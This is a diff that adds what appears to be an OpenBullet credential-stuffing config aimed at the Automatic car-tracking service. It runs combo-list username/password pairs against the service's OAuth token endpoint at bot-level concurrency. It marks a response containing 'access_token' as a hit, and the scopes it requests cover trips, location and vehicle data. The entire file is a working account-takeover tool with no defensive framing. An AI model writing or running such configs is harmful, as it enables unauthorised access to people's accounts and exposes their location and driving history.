@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "Automatic",
+  "SuggestedBots": 15,
+  "LastModified": "2018-10-02T11:13:06.0391078+00:00",
+  "AdditionalInfo": "Real-tme Auto Stats and GPS Tracking",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "5",
+      "Id": 160182529
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "5",
+      "Id": 960546757
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://accounts.automatic.com/oauth/access_token/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>%24&client_id=385be37e93925c8fa7c7&grant_type=password&scope=scope%3Atrip%20scope%3Alocation%20scope%3Avehicle%3Aprofile%20scope%3Avehicle%3Aevents%20scope%3Auser%3Aprofile%20scope%3Aautomatic%20scope%3Abehavior" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://dashboard.automatic.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
